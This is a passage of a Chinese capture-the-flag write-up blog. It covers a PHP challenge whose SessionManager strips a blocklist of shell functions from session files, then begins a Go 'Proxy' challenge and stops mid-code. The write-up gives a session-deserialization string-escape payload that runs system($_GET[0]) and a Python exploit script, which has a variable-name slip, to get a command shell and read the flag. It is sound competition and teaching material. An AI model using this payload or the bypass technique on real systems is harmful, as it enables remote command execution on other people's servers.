    <span class="token variable">$characters</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span><span class="token punctuation">;</span>
    <span class="token variable">$charactersLength</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$characters</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$randomString</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$randomString</span> <span class="token operator">.=</span> <span class="token variable">$characters</span><span class="token punctuation">[</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$charactersLength</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token variable">$randomString</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>


<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">SessionManager</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$sessionPath</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$sessionId</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$sensitiveFunctions</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'eval'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'exec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'passthru'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'shell_exec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'popen'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'proc_open'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">session_status</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">PHP_SESSION_NONE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Session has not been started. Please start a session before using this class."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sessionPath</span> <span class="token operator">=</span> <span class="token function">session_save_path</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sessionId</span> <span class="token operator">=</span> <span class="token function">session_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">getSessionFilePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sessionPath</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/sess_"</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sessionId</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">filterSensitiveFunctions</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$sessionFile</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getSessionFilePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$sessionFile</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$sessionData</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$sessionFile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sensitiveFunctions</span> <span class="token keyword">as</span> <span class="token variable">$function</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$sessionData</span><span class="token punctuation">,</span> <span class="token variable">$function</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token variable">$sessionData</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$sessionData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$sessionFile</span><span class="token punctuation">,</span> <span class="token variable">$sessionData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token keyword">return</span> <span class="token string double-quoted-string">"Sensitive functions have been filtered from the session file."</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token string double-quoted-string">"Session file not found."</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>很明显我们的目标是 notouchitsclass 类，那么重点就在这里的<code>$result = $sessionManager-&gt;filterSensitiveFunctions();</code>了</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">SessionManager</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$sessionPath</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$sessionId</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$sensitiveFunctions</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'eval'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'exec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'passthru'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'shell_exec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'popen'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'proc_open'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">session_status</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">PHP_SESSION_NONE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Session has not been started. Please start a session before using this class."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sessionPath</span> <span class="token operator">=</span> <span class="token function">session_save_path</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sessionId</span> <span class="token operator">=</span> <span class="token function">session_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">getSessionFilePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sessionPath</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/sess_"</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sessionId</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">filterSensitiveFunctions</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$sessionFile</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getSessionFilePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$sessionFile</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$sessionData</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$sessionFile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sensitiveFunctions</span> <span class="token keyword">as</span> <span class="token variable">$function</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$sessionData</span><span class="token punctuation">,</span> <span class="token variable">$function</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token variable">$sessionData</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$sessionData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$sessionFile</span><span class="token punctuation">,</span> <span class="token variable">$sessionData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token keyword">return</span> <span class="token string double-quoted-string">"Sensitive functions have been filtered from the session file."</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token string double-quoted-string">"Session file not found."</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>一眼 str_replace 的替换关键词，直接双写或者拼接绕过</p>
<p>而我们只有 sessionId 可控，打session反序列化</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">15</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"notouchitsclass"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">24</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"('sys'.'tem')(<span class="token interpolation"><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></span>);"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>问题是只靠 user 或者 password 都无法凑出正确的序列化格式，注意到还有个 session 里面还有 session_key 可以用，尝试覆盖 session_key 来传入一个完整的序列化字符串</p>
<p>然后在 user 处利用 replace 替换实现字符串逃逸，增加 user 的长度来使内容包裹形如<code>&quot;;session_key|s:26:&quot;y4jqJ94NGupXb3haeJPiRwH2Gt&quot;;password|s:96:</code>，共逃逸62位</p>
<p>另一个问题是不清楚原有的 session_key 长度是多少，不过这个问题可以通过爆破来解决，直接给username传入<code>popenpopenpopenpopenpopenpopenpopenpopenpopenpopen</code>预期覆盖50位</p>
<p>password传入前后闭合的序列化字符串</p>
<p>payload：</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
    'password'<span class="token operator">:</span>
    ';session_key|O<span class="token operator">:</span><span class="token number">15</span><span class="token operator">:</span><span class="token property">"notouchitsclass"</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>s<span class="token operator">:</span><span class="token number">4</span><span class="token operator">:</span><span class="token string">"data"</span>;s<span class="token operator">:</span><span class="token number">24</span><span class="token operator">:</span><span class="token string">"(\'sys\'.\'tem\')($_GET[0]);"</span>;<span class="token punctuation">&#125;</span>password|s<span class="token operator">:</span><span class="token number">1</span><span class="token operator">:</span>"a'<span class="token punctuation">,</span>
    'username'<span class="token operator">:</span> 'popenpopenpopenpopenpopenpopenpopenpopenpopenpopen'
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>exp：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

params <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'0'</span><span class="token punctuation">:</span> <span class="token string">"ls+/"</span><span class="token punctuation">&#125;</span>

data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">'password'</span><span class="token punctuation">:</span>
    <span class="token string">';session_key|O:15:"notouchitsclass":1:&#123;s:4:"data";s:24:"(\'sys\'.\'tem\')($_GET[0]);";&#125;password|s:1:"a'</span><span class="token punctuation">,</span>
    <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'popenpopenpopenpopenpopenpopenpopenpopenpopenpopen'</span>
<span class="token punctuation">&#125;</span>

url <span class="token operator">=</span> <span class="token string">"http://eci-2zealtn2xy2kvfyzdnk4.cloudeci1.ichunqiu.com/"</span>
<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
    response1 <span class="token operator">=</span> res<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">'/index.php'</span><span class="token punctuation">,</span>
                       params<span class="token operator">=</span>params<span class="token punctuation">,</span>
                       data<span class="token operator">=</span>data<span class="token punctuation">,</span>
                       allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    response2 <span class="token operator">=</span> res<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">'/index.php'</span><span class="token punctuation">,</span>
                       params<span class="token operator">=</span>params<span class="token punctuation">,</span>
                       data<span class="token operator">=</span>data<span class="token punctuation">,</span>
                       allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    response3 <span class="token operator">=</span> res<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">'/dashboard.php?0=ls+/'</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">"flag"</span> <span class="token keyword">in</span> response3<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>response3<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span>
        <span class="token keyword">break</span>
    res<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>直接&#x2F;readflag</p>
<p><img src="/blog/2024/11/02/%E5%BC%BA%E7%BD%91%E6%9D%AFS8/image-20241103094736389.png" alt="image-20241103094736389"></p>
<hr>
<h1 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h1><p>main.go</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"bytes"</span>
	<span class="token string">"io"</span>
	<span class="token string">"net/http"</span>
	<span class="token string">"os/exec"</span>

	<span class="token string">"github.com/gin-gonic/gin"</span>
<span class="token punctuation">)</span>

<span class="token keyword">type</span> ProxyRequest <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>
	URL             <span class="token builtin">string</span>            <span class="token string">`json:"url" binding:"required"`</span>
	Method          <span class="token builtin">string</span>            <span class="token string">`json:"method" binding:"required"`</span>
	Body            <span class="token builtin">string</span>            <span class="token string">`json:"body"`</span>
	Headers         <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">string</span> <span class="token string">`json:"headers"`</span>
	FollowRedirects <span class="token builtin">bool</span>              <span class="token string">`json:"follow_redirects"`</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	r <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

	v1 <span class="token operator">:=</span> r<span class="token punctuation">.</span><span class="token function">Group</span><span class="token punctuation">(</span><span class="token string">"/v1"</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
		v1<span class="token punctuation">.</span><span class="token function">POST</span><span class="token punctuation">(</span><span class="token string">"/api/flag"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			cmd <span class="token operator">:=</span> exec<span class="token punctuation">.</span><span class="token function">Command</span><span class="token punctuation">(</span><span class="token string">"/readflag"</span><span class="token punctuation">)</span>
			flag<span class="token punctuation">,</span> err <span class="token operator">:=</span> cmd<span class="token punctuation">.</span><span class="token function">CombinedOutput</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
			<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
				c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusInternalServerError<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"error"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Internal Server Error"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
				<span class="token keyword">return</span>
			<span class="token punctuation">&#125;</span>
			c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusOK<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"flag"</span><span class="token punctuation">:</span> flag<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
		<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span>

	v2 <span class="token operator">:=</span> r<span class="token punctuation">.</span><span class="token function">Group</span><span class="token punctuation">(</span><span class="token string">"/v2"</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
		v2<span class="token punctuation">.</span><span class="token function">POST</span><span class="token punctuation">(</span><span class="token string">"/api/proxy"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">var</span> proxyRequest ProxyRequest
			<span class="token keyword">if</span> err <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">ShouldBindJSON</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>proxyRequest<span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
				c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusBadRequest<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"error"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Invalid request"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
				<span class="token keyword">return</span>
			<span class="token punctuation">&#125;</span>

			client <span class="token operator">:=</span> <span class="token operator">&amp;</span>http<span class="token punctuation">.</span>Client<span class="token punctuation">&#123;</span>
				CheckRedirect<span class="token punctuation">:</span> <span class="token keyword">func</span><span class="token punctuation">(</span>req <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">,</span> via <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token builtin">error</span> <span class="token punctuation">&#123;</span>
					<span class="token keyword">if</span> <span class="token operator">!</span>req<span class="token punctuation">.</span>URL<span class="token punctuation">.</span><span class="token function">IsAbs</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
						<span class="token keyword">return</span> http<span class="token punctuation">.</span>ErrUseLastResponse
					<span class="token punctuation">&#125;</span>

					<span class="token keyword">if</span> <span class="token operator">!</span>proxyRequest<span class="token punctuation">.</span>FollowRedirects <span class="token punctuation">&#123;</span>
						<span class="token keyword">return</span> http<span class="token punctuation">.</span>ErrUseLastResponse
					<span class="token punctuation">&#125;</span>

					<span class="token keyword">return</span> <span class="token boolean">nil</span>
				<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
			<span class="token punctuation">&#125;</span>

			req<span class="token punctuation">,</span> err <span class="token operator">:=</span> http<span class="token punctuation">.</span><span class="token function">NewRequest</span><span class="token punctuation">(</span>proxyRequest<span class="token punctuation">.</span>Method<span class="token punctuation">,</span> proxyRequest<span class="token punctuation">.</span>URL<span class="token punctuation">,</span> bytes<span class="token punctuation">.</span><span class="token function">NewReader</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>proxyRequest<span class="token punctuation">.</span>Body<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
			<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
				c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusInternalServerError<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"error"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Internal Server Error"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
				<span class="token keyword">return</span>
			<span class="token punctuation">&#125;</span>

			<span class="token keyword">for</span> key<span class="token punctuation">,</span> value <span class="token operator">:=</span> <span class="token keyword">range</span> proxyRequest<span class="token punctuation">.</span>Headers <span class="token punctuation">&#123;</span>
				req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span>
			<span class="token punctuation">&#125;</span>

			resp<span class="token punctuation">,</span> err <span class="token operator">:=</span> client<span class="token punctuation">.</span><span class="token function">Do</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span>

			<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
				c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusInternalServerError<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"error"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Internal Server Error"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
				<span class="token keyword">return</span>
			<span class="token punctuation">&#125;</span>

			<span class="token keyword">defer</span> resp<span class="token punctuation">.</span>Body<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

			body<span class="token punctuation">,</span> err <span class="token operator">:=</span> io<span class="token punctuation">.</span><span class="token function">ReadAll</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>Body<span class="token punctuation">)</span>
			<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
				c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusInternalServerError<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"error"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Internal Server Error"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
				<span class="token keyword">return</span>
			<span class="token punctuation">&#125;</span>

			c<span class="token punctuation">.</span><span class="token function">Status</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>StatusCode<span class="token punctuation">)</span>
			<span class="token keyword">for</span> key<span class="token punctuation">,</span> value <span class="token operator">:=</span> <span class="token keyword">range</span> resp<span class="token punctuation">.</span>Header <span class="token punctuation">&#123;</span>
				c<span class="token punctuation">.</span><span class="token function">Header</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
			<span class="token punctuation">&#125;</span>

			c<span class="token punctuation">.</span>Writer<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span>
			c<span class="token punctuation">.</span><span class="token function">Abort</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
		<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span>

	r<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1:8769"</span><span class="token punctuation">)</span>
